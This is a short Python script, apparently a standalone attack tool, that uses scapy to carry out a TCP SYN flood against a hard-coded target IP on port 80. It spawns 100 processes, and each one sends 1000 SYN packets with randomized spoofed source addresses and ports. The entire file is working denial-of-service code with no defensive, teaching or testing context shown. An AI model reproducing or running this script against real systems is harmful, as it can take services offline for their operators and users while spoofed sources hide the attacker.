from scapy.all import IP, TCP, RandIP, RandShort, sendpfast
from multiprocessing import Process

target_ip = "192.168.1.1"
target_port = 80
num_processes = 100
packets_per_process = 1000

def syn_flood(target_ip, target_port):
    for _ in range(packets_per_process):
        src_ip = RandIP()
        src_port = RandShort()
        
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip/tcp
        
        sendpfast(packet, pps=1000, verbose=False)

if __name__ == "__main__":
    processes = []
    for _ in range(num_processes):
        p = Process(target=syn_flood, args=(target_ip, target_port))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
